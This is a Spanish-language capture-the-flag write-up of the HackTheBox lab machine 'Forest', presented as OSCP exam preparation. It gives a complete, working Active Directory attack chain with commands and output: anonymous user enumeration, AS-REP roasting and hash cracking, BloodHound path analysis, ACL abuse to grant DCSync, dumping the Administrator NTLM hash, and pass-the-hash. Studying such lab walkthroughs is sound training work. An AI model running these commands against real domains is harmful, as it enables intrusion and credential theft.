# HTB Forest — Writeup completo (OSCP style)

> **Máquina:** Forest  
> **IP:** 10.129.95.210  
> **Dominio:** htb.local  
> **DC:** FOREST (Windows Server 2016 Standard 14393)  
> **Dificultad:** Fácil  
> **Técnicas:** Null Session, AS-REP Roasting, BloodHound, GenericAll, WriteDacl, DCSync, Pass-the-Hash

---

## 0. Reconocimiento inicial — Nmap

```bash
sudo nmap -sV -oA $IP.nmap $IP
```

**Puertos abiertos relevantes:**

| Puerto | Servicio | Notas |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | DC = htb.local |
| 135 | MSRPC | |
| 139 | NetBIOS | |
| 389 | LDAP | Domain: htb.local |
| 445 | SMB | Windows Server 2008 R2 - 2012 |
| 464 | kpasswd5 | |
| 593 | RPC over HTTP | |
| 636 | LDAPS | tcpwrapped |
| 3268 | LDAP Global Catalog | |
| 3269 | LDAPS GC | tcpwrapped |
| **5985** | **WinRM** | **Acceso remoto potencial** |

**Conclusiones:**
- Es un **Domain Controller** de AD (`htb.local`).
- **WinRM abierto** → vector de acceso inicial si consigues credenciales.
- **LDAP y SMB abiertos** → enumeración anónima potencial.

---

## 1. Enumeración anónima (Null Session)

### 1.1 Verificar null session en SMB

```bash
nxc smb $IP
```

Salida clave:
```
SMB  10.129.95.210  445  FOREST  [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
```

**`Null Auth: True`** → el servidor permite autenticación anónima.

### 1.2 Enumerar usuarios vía SMB

```bash
nxc smb $IP --users
```

**Resultado:** 31 usuarios enumerados. Filtramos los reales (ignorando `HealthMailbox*`, `SM_*`, `krbtgt`, `Guest`, `DefaultAccount`):

| Usuario | Last PW Set | Notas |
|---|---|---|
| sebastien | 2019-09-20 | |
| lucinda | 2019-09-20 | |
| **svc-alfresco** | **2026-09-30 18:10:36** | **Cuenta de servicio, PW reciente** |
| andy | 2019-09-22 | |
| mark | 2019-09-20 | |
| santi | 2019-09-20 | |

**Pista clave:** `svc-alfresco` es una **cuenta de servicio** (`svc-` prefix) y su contraseña se cambió **justo antes del escaneo**. Las cuentas de servicio suelen tener Kerberos Pre-Auth deshabilitado.

### 1.3 Verificar LDAP anónimo

```bash
nxc ldap $IP
```

Salida:
```
LDAP  10.129.95.210  389  FOREST  [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
```

**`signing:None`** y **`No TLS cert`** → LDAP acepta binds anónimos.

---

## 2. AS-REP Roasting

### 2.1 ¿Qué es?

Kerberos AS-REP Roasting abusa de cuentas con **"Do not require Kerberos preauthentication"** habilitado. Cuando pre-auth está deshabilitado, el KDC devuelve un **AS-REP** cifrado con la contraseña del usuario, que puede crackearse **offline** sin riesgo de bloqueo.

### 2.2 Crear lista de usuarios

```bash
cat > users.txt << EOF
sebastien
lucinda
svc-alfresco
andy
mark
santi
EOF
```

### 2.3 Lanzar AS-REP Roasting

```bash
nxc ldap $IP -u users.txt -p '' --asreproast asrep.txt
```

**Resultado:**
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7b05cbc5c95a96a54d4b2c443fb3abd7$40271e380118d733d0f445ef8913f29b...
```

**`svc-alfresco` tiene pre-auth deshabilitado.** Hash obtenido.

### 2.4 Identificar el hash con haiti

```bash
cat asrep.txt | tr -d '\n' | haiti -
```

Salida:
```
Kerberos 5 AS-REP etype 23 [HC: 18200] [JtR: krb5asrep]
```

- **Hashcat mode:** 18200
- **John format:** krb5asrep

### 2.5 Crackear con Hashcat

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

**Resultado (2 segundos):**
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
Status...........: Cracked
```

**Credenciales:** `svc-alfresco:s3rvice`

### 2.6 Acceso inicial por WinRM

```bash
evil-winrm -i $IP -u svc-alfresco -p 's3rvice'
```

**Shell obtenido.** Ya somos un usuario de dominio.

---

## 3. Enumeración con BloodHound

### 3.1 Recolectar datos con bloodhound-python

```bash
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns $IP -c All --zip
```

**Flags clave:**
- `-ns $IP` → usa el DC como DNS (crítico para resolver `htb.local`).
- `-c All` → recolecta usuarios, grupos, computadoras, sesiones, ACLs, GPOs.
- `--zip` → empaqueta todo en un ZIP para importar.

### 3.2 Importar en BloodHound

1. Arrancar Neo4j: `sudo neo4j start`
2. Arrancar BloodHound: `bloodhound &`
3. Login en `http://localhost:7474` (neo4j/neo4j → cambiar password).
4. Arrastrar el ZIP a la GUI.

### 3.3 Analizar la ruta

**Query:** Click derecho en `SVC-ALFRESCO@HTB.LOCAL` → **"Shortest Paths to Domain Admins"**.

**Ruta encontrada:**

```
SVC-ALFRESCO@HTB.LOCAL
    │ MemberOf
    ▼
SERVICE ACCOUNTS@HTB.LOCAL
    │ MemberOf
    ▼
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
    │ MemberOf
    ▼
ACCOUNT OPERATORS@HTB.LOCAL
    │ GenericAll
    ▼
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
    │ WriteDacl
    ▼
HTB.LOCAL (Domain)
    │ Contains
    ▼
ADMINISTRATOR@HTB.LOCAL
```

**Nodos Tier Zero:** Domain, Administrator, Account Operators, Exchange Windows Permissions, Privileged IT Accounts, Service Accounts.

**`svc-alfresco` aparece con `Tag_Owned: true`** → BloodHound ya sabe que lo controlamos.

---

## 4. Entendiendo los edges de BloodHound

### 4.1 Tabla de edges → permisos AD → acciones

| Edge BloodHound | Permiso AD real | Qué permite | Acción `bloodyAD` |
|---|---|---|---|
| `GenericAll` | `GENERIC_ALL` | Control total del objeto | `add genericAll` |
| `GenericWrite` | `GENERIC_WRITE` | Escribir atributos | `set` (atributos) |
| `WriteDacl` | `WRITE_DAC` | Modificar la ACL | `add dcsync` / `add genericAll` |
| `WriteOwner` | `WRITE_OWNER` | Cambiar owner | `set owner` |
| `AddMember` | `ADS_RIGHT_DS_WRITE_PROP` | Añadir miembros a grupo | `add groupMember` |
| `ForceChangePassword` | `USER_FORCE_CHANGE_PASSWORD` | Cambiar password | `set password` |
| `DCSync` | `DS-Replication-Get-Changes` + `...All` | Replicar hashes | (usar `secretsdump`) |
| `AllExtendedRights` | Incluye DCSync | Replicar hashes | (usar `secretsdump`) |

### 4.2 Cómo deducir el comando de `bloodyAD`

**Estructura general:**
```
bloodyAD [conexión] [acción] [parámetros]
```

**Conexión (siempre igual):**
```bash
bloodyAD -u <user> -p <pass> -d <domain> --host <DC_IP>
```

**Acción:** se deduce del edge:
- Edge sobre **grupo** + `GenericAll`/`GenericWrite`/`AddMember` → `add groupMember`
- Edge sobre **dominio** + `WriteDacl` → `add dcsync`
- Edge sobre **usuario** + `ForceChangePassword` → `set password`
- Edge sobre **objeto** + `WriteOwner` → `set owner`

**Parámetros:** grupo objetivo + miembro a añadir (para `add groupMember`), o usuario a conceder (para `add dcsync`).

**Truco:** `bloodyAD --help` lista todas las acciones. Los nombres son autoexplicativos.

---

## 5. Explotación de la cadena

### Paso 1 — `GenericAll` sobre `Exchange Windows Permissions`

**Edge:** `ACCOUNT OPERATORS ──[GenericAll]──> EXCHANGE WINDOWS PERMISSIONS`

**Lógica:** `GenericAll` sobre un grupo permite modificar su membresía. `svc-alfresco` hereda `GenericAll` vía `Account Operators`.

**Comando:**
```bash
bloodyAD -u svc-alfresco -p 's3rvice' -d htb.local --host $IP add groupMember "Exchange Windows Permissions" svc-alfresco
```

**Alternativa con Samba:**
```bash
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" \
  -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "FOREST.htb.local"
```

**Verificación:**
```bash
net rpc group members "Exchange Windows Permissions" \
  -U "HTB.LOCAL"/"svc-alfresco"%"s3rvice" -S "FOREST.htb.local"
```

### Paso 2 — `WriteDacl` sobre el dominio → DCSync

**Edge:** `EXCHANGE WINDOWS PERMISSIONS ──[WriteDacl]──> HTB.LOCAL`

**Lógica:** `WriteDacl` sobre el dominio permite modificar la ACL del dominio. La ACL más rentable es **DCSync**.

**Comando (bloodyAD):**
```bash
bloodyAD -u svc-alfresco -p 's3rvice' -d htb.local --host $IP add dcsync svc-alfresco
```

**Alternativa (impacket-dacledit):**
```bash
impacket-dacledit -action 'write' -rights 'DCSync' \
  -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' \
  'htb.local'/'svc-alfresco':'s3rvice'
```

**Cleanup (opcional):**
```bash
impacket-dacledit -action 'remove' -rights 'DCSync' \
  -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' \
  'htb.local'/'svc-alfresco':'s3rvice'
```

### Paso 3 — DCSync al Administrator

**Lógica:** Con DCSync, `svc-alfresco` puede pedir al DC que le replique hashes vía DRSUAPI.

**Comando:**
```bash
impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@$IP -just-dc-user Administrator
```

**Resultado:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

**Hash NTLM del Administrator:** `32693b11e6aa90eb43d32c72a07ceea6`

### Paso 4 — Pass-the-Hash

```bash
evil-winrm -i $IP -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

**¡Domain Admin!** 👑

---

## 6. La cadena lógica completa

```
1. Null session en SMB/LDAP
   ↓ (enumerar usuarios)
2. Detectar svc-alfresco como cuenta de servicio
   ↓ (AS-REP Roasting)
3. Obtener hash AS-REP
   ↓ (crackear con hashcat)
4. Credenciales: svc-alfresco:s3rvice
   ↓ (evil-winrm + bloodhound-python)
5. BloodHound revela la ruta:
   svc-alfresco → Service Accounts → Privileged IT Accounts
   → Account Operators ──[GenericAll]──> Exchange Windows Permissions
   → ──[WriteDacl]──> HTB.LOCAL → Administrator
   ↓ (bloodyAD add groupMember)
6. Membresía en Exchange Windows Permissions
   ↓ (bloodyAD add dcsync)
7. DCSync concedido a svc-alfresco
   ↓ (secretsdump)
8. Hash NTLM de Administrator
   ↓ (evil-winrm -H)
9. Domain Admin
```

---

## 7. Por qué cada paso lleva al siguiente

| Paso | Qué produces | Siguiente paso natural |
|---|---|---|
| AS-REP Roasting | Hash AS-REP | Crackear → credenciales |
| Credenciales | Acceso autenticado | BloodHound → ruta |
| GenericAll sobre grupo | Membresía | Usar privilegios del grupo |
| WriteDacl sobre dominio | Capacidad de modificar ACL | Concederte DCSync |
| DCSync | Hash NTLM | Pass-the-Hash |
| Pass-the-Hash | Shell como Administrator | Domain Admin |

**Regla de oro:** *"¿Qué me da este paso? ¿Qué puedo hacer con eso? ¿Cuál es el siguiente privilegio que necesito?"*

---

## 8. Alternativas y consideraciones

### 8.1 `AllExtendedRights` en lugar de `WriteDacl`

Si el edge fuera `AllExtendedRights` sobre el dominio, **ya tendrías DCSync** sin necesidad de concedértelo. Irías directo a `secretsdump`.

### 8.2 `GenericAll` con herencia (alternativa a DCSync)

Si DCSync falla (DC caído, puertos filtrados), puedes usar:
```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance \
  -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' \
  'htb.local'/'svc-alfresco':'s3rvice'
```

Esto te da control total sobre **todos los objetos descendientes** del dominio. No funciona sobre objetos con `adminCount=1` (AdminSDHolder).

### 8.3 Objetos con herencia deshabilitada

Si la herencia está deshabilitada, la vía alternativa es modificar el `gPLink` del dominio para desplegar un GPO malicioso (herramienta `OUned.py`).

---

## 9. Herramientas usadas

| Herramienta | Uso |
|---|---|
| `nmap` | Reconocimiento de puertos |
| `nxc` (NetExec) | Enumeración SMB/LDAP, AS-REP Roasting |
| `haiti` | Identificación de hashes |
| `hashcat` | Crackeo de hashes (modo 18200) |
| `evil-winrm` | Shell remoto por WinRM |
| `bloodhound-python` | Recolección de datos AD |
| `bloodyAD` | Abuso de ACLs (add groupMember, add dcsync) |
| `impacket-secretsdump` | DCSync (extracción de hashes) |
| `impacket-dacledit` | Modificación de ACLs (alternativa) |
| `net rpc` (Samba) | Alternativa para modificar grupos |

---

## 10. Lecciones para OSCP

1. **Null session es oro.** Siempre prueba `nxc smb $IP --users` y `nxc ldap $IP` sin credenciales.
2. **Cuentas de servicio (`svc-`) son objetivos prioritarios.** Suelen tener pre-auth deshabilitado.
3. **AS-REP Roasting es rápido y silencioso.** Sin riesgo de bloqueo.
4. **BloodHound es tu mapa.** No memorices rutas; aprende a leer edges.
5. **Cada edge tiene una acción.** `GenericAll` sobre grupo → `add groupMember`. `WriteDacl` sobre dominio → `add dcsync`.
6. **`--help` es tu writeup.** `bloodyAD --help` lista todas las acciones.
7. **DCSync no es siempre la respuesta.** Depende del edge y del contexto.
8. **Documenta cada paso.** En el examen, las notas valen oro.

---

## 11. Referencias

- [BloodHound Edges Documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
- [The Hacker Recipes — DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [Impacket — secretsdump](https://github.com/fortra/impacket)
- [bloodyAD — GitHub](https://github.com/CravateRouge/bloodyAD)